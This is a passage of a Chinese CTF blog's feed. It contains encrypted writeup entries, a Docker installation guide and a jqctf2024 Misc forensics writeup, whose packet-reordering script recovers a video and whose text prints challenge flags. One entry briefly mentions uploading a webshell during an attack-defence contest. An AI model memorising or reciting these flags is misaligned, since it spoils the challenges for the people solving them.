b2f959dc2b8e4d597c32a0c9609adbe5aba3bbe3c69cca73d414368bc6000b665cdc3a85c9314015e77bc88d3b7559a5b27f25a8cd67a9472fef5295f85309e994f0008e9ccf4a13d20b53f7a7949af44b589aaa91c44c07bff4b27e93398b274c9e50cc102f758aede95f5c5ba06eaa5b28e46afc51a9b050217b70b01599db8e8847d33c45be68dab632eb494fad5181117ff36e871f2f05b6230302346a525a715cde2c47977b61bd5bf8b1f6ebb92e863b962f0717a46653cd8d681c6a6a98d3f644778bb03513bef1e5e6520e14f0c7053cda9cebf5660b8d3ca05821898cc24cb873c75e32ab6ea76af38e404d00f04dba5a3cf0bf7d08a43b328017cb315f8369952a03c51b148e12600748a0f9b8f64af7046f517bc8f48adaec880c4b0b8e631167ba8e80ea7c6f25960df066830bb6c56a3a5a8f7d10e365c0698b87b705facbd577a3dbd92218abb2f22b3a9a264c53b0df382715113034a996dac330f3df0e46b576c131256a21c49c4da01970698538bb1073ea5f34dc6df07c812c9938fc1b75f4a122219d1fafc23d222a54231526490bc7ed505c85e0d91138cd657cf4d72ae768763ecfa2d1ee93ba3ee4d28a527541e328ec9cdf6e0fce9c6f7ecef591a645292e96555dd97518f5c24178491934a63543346d93e1b79e1a28da6bfe15553ff0136cd9bb2b62ed30c10e503c5d294407596d5fcf1706f6d0b18c39a1425c35d18e348ec8905793169f7433cd7603844bcee018bca219d632900bc87d954f4013e32155dff0de8fc4643f05516b81084</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟 2024 Misc 招新题 第一题（需要密码）</title>
      <link href="/posts/c06ae389/"/>
      <url>/posts/c06ae389/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6bb92ae3f65d55d43753c990f7cdd84398a7a70db03014a4eb8a2e79102a5d5b">825b23be34d6e48a379c92804d8d7913b80bfb012895b0b2a494eea7a99da8d9a8f92ba0a2640c516f4059eecd48968e09d7b3b1c9db24aac6327b82a3b813d8bd9ed1d83df9d509c685c5d2dcf92e56c7c84fcc5a7f3329e59af32b03165e8ee35b9196fcab97dedb6ded42c3e314b7e07d91d1e710dd5ef93aa1f972968721ee3199b7cd46c2d6ce84d33df79b47ebcb5105289eda79d9d416804b9604a8207c13c6dca7123e98e0b24dc76e14511e76154fa7ad72a225ebc2768d9ebc8f4984a405a3527e8da07653e0ead301e7935352bda18376908e1dc7b74688e00a1816ad468b32546972dc66a44cdcc9573eeccde1e3d50f4b00851c0523961a165610931f8d7b51212ab77aee3290c9b2ddc6ab44c65c25c80c06a3521c1fb050fb27f46a0339ec0e7990dbdf84dbd446aed604adef5cbe6c38b2fdec203f98527a8aef7236a2d4ac6cf256ca0c25d2430780bfc90197222988057903b15927a3bf3f23757d69ea022dd1fef1a43c5e47acb1c0ae23a2af938dc22cab9d7ad66a37602aa251dde7304330ca22e2b94c0fd8e328e10f1685811f79785843defed99ae58171c346ebbc298778e3686646023c4fa511c51205ee117942f2588fd9a9a46654007bec0c1a5f0ba19cf4ff902deab9a5e23eec1a236a42258c8b88828ab9c6a4d865de043474b5ec64048948d638a9dc3184cb8eef3f2a6e8b50a974014e3d45bb2555eaf80491703fba51e63094c8a7c4124cf74c0d024751873acee1c6486d73e938f65e2c4b8bdf19abba553b48f0138e20f32c50c523be3fbae072677efef1589371df2665d39bd34ed510c6b9f21c9d40cae3bce7ac36923aa15c821d6c3efdee7c2a87b39e430e37410c9ac3047972ac30400a2492734df157aba331fc7826ea37ae49a761c66ff319f075225bd861197318d377f8859e12eab0c4d86fb86213391ac32e7434fbad1ac61cd473bf1b370f865a34d32bf727fb25ee234324e904415f95645f34d80c0d02beab744689d1f2e3d1566af3c6d93d28a230461d42af794319ef2527c89d27e6370194a234ff6e20c750484a552c035505404f81907b6b34e2d2d3b1ce8b3152dbbebfe16577a2cd1ffd7751caed81e4dedc429fc0f29f1a2a03183a8ec554ef1984e91d30c1eb5e339d22914221c894e457f8c5e513a494824fb20ce1df485950596c6f8c7b48825ae4b1e003283ed3f6abb75fbf885ee4c8efcbbf4baaa94a7d9152873c7ef8bb23d6e9dcc596c258a95cb593efb3c2926ef40de8d04f43ada37cc024741ec51a5fcf7620476776bfcc5034d709cf405ddcb8c0b53f9c2c1b21f6f9ee861f4865a33855f0932244902a0620e9bac821468aa33fc6bf4b7472039dcc0392f564a05c699a73d38a703ea9994d96c5ec78ca0dc0071d175f8ad9a961b699f6870a96c1f13380e9ffdeef17669a1c86eef97d8649791c28c969d0426022e16cf9a3eca24c5bd5d58acc6272778dc9da0f60faa2a8786a6acfa3a803395833fd6ab4298d03453b549112faccd20a14d4f21f38459ac1920b8144599906ef791bb2695c434e4d13fd81a3b071eab4b09467235722e4f8d5ef8f150af8c1f02c92c06d0ddbefbbb071a98ab89f1d951907c09c1656ba4a78141da1d12f93cd2ef54c84e08f3d4563b33f4e92a37b43bdb8ea6509f215bfef964b9d8fc59a7b86e14405e766a29733fd684762a07e0a4d8483629c387abcf09be33e6580f254847fe5666f57b03010a23090b5a9e97126b940aa88366c5ad7441a9dfd6e793f3ad8e302430509e80ff11029828c50333b2b3c56cefcb49dc76e9366998d386a928b155f116d5c89b13b8cde2b28eee82f17f1cb9a76064d076a20a7990d2bcef89cbcfe9234989266c74d98e7c17aecaa0601da55449f5ac1e18e063b605f7820a796e9075c2f643cb5ee95796b79d234f73f04e3a997ebcfdcef312b6bdf3cedbe0e2c687efef35356b18cc6c169d315a4045da52fa17870951cc7f78ac95643faaa803c1205f53e8ea0a04001afd91b8df0c0d93a196060fe22d542df30693869b4aad98ab27141e6093c69dd0eabe4ac97abb69d9cb625456a2a3f7c1d38d2c22941ef292df80b2596d060844d0e213db0e2ecc1b0434e3c16d1c92b7b1dde35cd08a6058c99c82b45f4613af67dd0aed4dfd4fdb0ed0f7fcc5460145471874e4acd36c6f918c6bc4eb57beed0ff80fa71623f2a6ea80bfd0cc64b6c240a66c2b97b63ff019a98a05f9ef0bdcd46ad527779c4b6a4fc7d7712137c5b264bccf89eab91080fc13015bbb0e5f46916ce4a620b0f0d916787327fc9deda6b8a4736622b9818bd8731202a6220b82576e160670c86a63f7a544f2e3fe158f7fb7685619ca19c878d5d3575acada2a80708639cb89b5de57391588dde1ce8f7c2820ae3b5423352942d510146cc5dd88c43b10bb8b5e0d52ca0b23a6122c980113810d3aea6baf77438e8d7695000f50ba4276d01d556382fb316cdadc3d4ebe613f15f24ae2bed75b60d5d08ad933020c675fb76ceab97ded7d6c5e66fb0c12f70302445ebbfc7de06e7c19608b4df0b37834cbe061f627a46621661c5d538e5ba9d78eed85734c780214c8c126ab1644c1533a1fa1f430b0daccbaa2f73030663a74f5a8ee341fc37da674ff23ae643c2ee06f48ac32363efb08a5f5773928e30fdfc1f5ee02d582640b703c0dfa74b2606adbe3c2f58f4ef8266103420beeddeec034f6fb287d08f8efbe3a80048e2b8d893cd044bbfc15b8af100a9e8719f22ae7e44de0622efaaaf90b87b14cf363bacba064f3b1660a2c7eac20b1b4ff58071619f1017517fe4e03eda25672059e71a7ac5fa5339cc9bfd66424bfe9aa219775d5192032892571c7c92a2d53dc7ab7765814f79ed03059ae9233337ed1ee6cd9ffaf1c62572099fcdb28740241e48dd5773e54a3e8478f4e855d0b720f1f644cdcc472060a60259405f72acfbc756ba6576328655f10cf8aa8e76998b5256eac738636f6417f6d7c4da9af764c8762a7b14e36832a0552971a579244e4b73887429bf7cd75c97791ed33e03f159b0c0360d78c5577f803fc85dcb500fd74291d0fb859b10f11b4a145c2da61b59ea0308151743c104dc91782c2b574e5286fc946aa993e00fd6f20fea59619b8afc71e4fe95e0c4111bbab8dcaf5a8debde0081448a69c013216a1d1109ff30fcf83abec1b6821d932ec7c7ee343d5f1cfbc2e01538456b02a03dae0605e5425ec63545bb2af9168e860176131408c3f7ef24efe45239ae7efad3d13c49faffd89683edceb344cdf68991d7436d20421fe6fee3fb9ab0428d76ce45073fab80ab1cba77d4d4128332383d513dfb833cbc8d6abcd73480530d05da77d25e1be83c25711d1d3c0c7ce644cfdfd19a8dccfd372ef8776d51b4ef64fb173d1d35f709898cb90366e38c9dde9570cdd76675d4b5c8f86bec9030f7fc3ac86d6a0718668adea0bd381de3debda86de21456cceddda6f99f210362778021c787d6763c886a812b9bccd90526fd6adbbaba33f8b61fcab0bf066b0d6c83007a94c1d8e4a802f567970012b39a189f49c28321f8d545109778381e53737843338495e5f45c9d95db77ad8027d5188ecbd7c5083aacef1d594eb018314e2eea854e2f3b1b28ec347981a55f77f02414c3db7289fd980db3231ba64aa9de9b92267414e3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker安装使用记录（极简版）</title>
      <link href="/posts/a59e056f/"/>
      <url>/posts/a59e056f/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用到哪里写到哪里吧，随着使用的深入以后还会更新这篇文章</p></blockquote><p>参考文章传送门：</p><p><a href="https://blog.csdn.net/u012563853/article/details/125295985?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172148665016800188528574%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172148665016800188528574&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125295985-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=ubuntu%20docker&spm=1018.2226.3001.4187">文章一</a>，<a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172136879616800211563088%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172136879616800211563088&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=docker&spm=1018.2226.3001.4187">文章二</a>，<a href="https://blog.csdn.net/jsnhux/article/details/89847109">文章三</a>，<a href="https://www.runoob.com/docker/docker-dockerfile.html">文章四</a></p><h2 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h2><h3 id="docker介绍"><a href="#docker介绍" class="headerlink" title="docker介绍"></a>docker介绍</h3><p>Docker是一个可以用来装web应用的容器。Docker这个词的本义是码头工人，主要工作就是搬运那些“集装箱”，将它们搬运到相应的目的地去。Docker拥有着一个“超级码头”，或者说一个巨大的物流中心，我们可以把我们的“集装箱”push到这个超级码头去，以便我们在另一个码头时可以将它直接pull过来，而不是就地复刻一个曾经我们拥有过的集装箱。</p><p>有些文章中会拿docker和虚拟机作对比，深入而又透彻，什么使用了LXC技术，不需要HyperV转换之类的，这里我就不再赘述了，总结来说就是docker容器更为轻量，运行起来更为快速。</p><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p>镜像，英文image，也就是上面我们提到的”集装箱“，我们的那个”超级码头“也就是镜像源。镜像的联合文件系统我也不再在这里赘述，感兴趣可以自行跳入上面的传送门去了解。</p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>容器，英文名container，可以理解为镜像的实例化。镜像是不可编辑的，容器是可以编辑的。我们可以用一个镜像生成多个容器。容器与容器之间互不干扰。</p><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p>说明：笔者电脑系统为Ubuntu 24.04 LTS，下面的操作都在root权限下进行</p><h3 id="卸载旧版"><a href="#卸载旧版" class="headerlink" title="卸载旧版"></a>卸载旧版</h3><p>如果以前安装过，那么先卸载一下旧版docker，没有则无需卸载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure><h3 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h3 id="写入软件源"><a href="#写入软件源" class="headerlink" title="写入软件源"></a>写入软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span><br></pre></td></tr></table></figure><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><h3 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="安装一些工具"><a href="#安装一些工具" class="headerlink" title="安装一些工具"></a>安装一些工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>重启一下docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><h3 id="配置阿里云镜像加速器"><a href="#配置阿里云镜像加速器" class="headerlink" title="配置阿里云镜像加速器"></a>配置阿里云镜像加速器</h3><p>登录你的阿里云账号，<a href="https://dev.aliyun.com/">传送门</a></p><p>点左上角三条杠–容器–容器镜像服务ACR–镜像工具–镜像加速器</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20240720234631745.png" alt="image-20240720234631745"></p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2024-07-20-234712.png" alt="屏幕截图 2024-07-20 234712"></p><p>网站上已经详细地说明了操作步骤，这里我还是将它一步一步分开说一下</p><p>&#x2F;etc&#x2F;docker应该是已经存在了，如果没有的话就用下面的命令去创建一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /etc/docker</span><br></pre></td></tr></table></figure><p>在&#x2F;etc&#x2F;docker路径下创建一个叫daemon.json的文件，编辑其内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://这里填上面给的地址.mirror.aliyuncs.com&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>重新加载一下daemon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="测试安装是否成功"><a href="#测试安装是否成功" class="headerlink" title="测试安装是否成功"></a>测试安装是否成功</h3><p>我们先拉取一个hello-world的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull hello-world</span><br></pre></td></tr></table></figure><p>运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>如果出现以下界面，则说明安装成功</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-00-11-44.png" alt="截图 2024-07-21 00-11-44"></p><h2 id="Docker简单命令"><a href="#Docker简单命令" class="headerlink" title="Docker简单命令"></a>Docker简单命令</h2><p>拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure><p>删除本地镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像名</span><br></pre></td></tr></table></figure><p>查看本地拥有的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>用某一镜像开启一个容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run 镜像名</span><br></pre></td></tr></table></figure><p>开启容器时在后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d 镜像名</span><br></pre></td></tr></table></figure><p>查看当前运行中的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>查看存在的容器（包括不在运行中的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>停止运行某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID（可通过上面的ps命令看到，可仅写ID的前几位）</span><br></pre></td></tr></table></figure><p>删除某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器ID</span><br></pre></td></tr></table></figure><p>进入某一容器，以bash界面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器ID bash</span><br></pre></td></tr></table></figure><p>想退出容器，则输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h2><p>说明：下文中客户端ip：192.168.3.18，服务端ip：192.168.3.25</p><p>这里简述一下如何在docker中跑一个对外的web服务，用nginx镜像举例</p><p>首先pull一下nginx的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-14-08-49.png" alt="截图-2024-07-21-14-08-49"></p><p>如果我们想让服务跑在服务端主机的11451端口，容器内跑在80端口，那么得用如下命令，在启动容器时做一个端口映射。<strong>注意记得开启服务端主机的11451端口。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 11451:80 nginx</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-14-16-37.png" alt="截图-2024-07-21-14-16-37"></p><p>这里我们可以看一下这个容器的ID和运行情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-14-18-55.png" alt="截图-2024-07-21-14-18-55"></p><p>可以看到已经成功运行了。</p><p>此时我们就可以用客户端浏览器去访问服务端的11451端口了，如果看到如下页面，那么就说明成功了。</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20240721142135086.png" alt="image-20240721142135086"></p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。通过定义一系列命令和参数，Dockerfile 指导 Docker 构建一个自定义的镜像。</p><p>dockerfile中的指令及其作用：</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20240809205825697.png" alt="image-20240809205825697"></p><p>要通过dockerfile构建镜像，首先切到dockerfile所在的目录下，然后执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t 自定义镜像名 .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Technology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2024 Writeup</title>
      <link href="/posts/8a411fd4/"/>
      <url>/posts/8a411fd4/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/LitCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> LitCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jqctf2024初赛 Misc</title>
      <link href="/posts/e597ed70/"/>
      <url>/posts/e597ed70/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一次X1cT34m前辈们的狂欢（竟然直接给干到第一了！！？），我只是做个misc给前辈们助助兴。。。</p></blockquote><h3 id="flag-video-version"><a href="#flag-video-version" class="headerlink" title="flag_video_version"></a>flag_video_version</h3><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 202344.png)</p><p>从sdp.txt中得知视频通过RTP传输，编码方式为H264</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 202557.png)</p><p>wireshark中Decode As RTP</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 202921.png)</p><p>从RTP流分析中可以看出序列存在问题，将每一个分组对应的序列保存进2.txt</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 203245.png)</p><p>追踪UDP流，将传输的内容保存进1.txt</p><img src="/images/jqctf2024初赛-Misc/屏幕截图 2024-05-26 203444.png" alt="屏幕截图 2024-05-26 203444" style="zoom:50%;" /><p>写脚本将这些数据包按照正常的顺序拼接起来，最终保存为data.264</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f3=<span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">num=[]</span><br><span class="line">ls=[]</span><br><span class="line">a=f2.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(a):</span><br><span class="line">    num.append(<span class="built_in">int</span>(a))</span><br><span class="line">    a=f2.readline().strip()</span><br><span class="line">b=f1.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(b):</span><br><span class="line">    ls.append(b)</span><br><span class="line">    b=f1.readline().strip()</span><br><span class="line">sorted_ls = [x <span class="keyword">for</span> _, x <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">zip</span>(num, ls))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sorted_ls:</span><br><span class="line">    f3.write(i)</span><br><span class="line">    f3.write(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/jqctf2024%E5%88%9D%E8%B5%9B-Misc/image-20240526203853688.png"></p><p>用MilkPlayer播放这个视频，视频展示了flag</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 204143.png)</p><p>flag{ef051f0cd551650c8b6c9eac7b5ad861}</p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>flag{605379906}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> jqctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024 Writeup</title>
      <link href="/posts/7b0218d9/"/>
      <url>/posts/7b0218d9/</url>
      
        <content type="html"><![CDATA[<h4 id="初赛Writeup"><a href="#初赛Writeup" class="headerlink" title="初赛Writeup"></a><a href="https://www.blog.st4rr.top/writeups/CISCN2024Writeup.pdf">初赛Writeup</a></h4><p>Additional Statement:</p><p>这是一次由四个大一新生组成的X2cT34m的奇妙冒险，</p><p>我参与做了crypto和一部分的misc</p><h4 id="华东北赛区赛Writeup"><a href="#华东北赛区赛Writeup" class="headerlink" title="华东北赛区赛Writeup"></a><a href="https://www.blog.st4rr.top/writeups/CISCN2024Writeup1.pdf">华东北赛区赛Writeup</a></h4><p>Additional Statement:</p><p>第一次打线下，AWDP模式。</p><p>太菜了，面对题目一脸懵（T0T）</p><p>但是听说是可以通过patch包传个马上去再攻击的（？？！），比赛时我们队虽然想到了但是没去试，还是打保守了。。。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024 Writeup</title>
      <link href="/posts/22e071ae/"/>
      <url>/posts/22e071ae/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://f4k3r.top/pdf_file/XYCTF2024%20%E5%88%AB%E7%AE%A1%20Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>Cooperated with <strong>f4k3r</strong>.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> XYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 CrazyC2</title>
      <link href="/posts/c00e3325/"/>
      <url>/posts/c00e3325/</url>
      
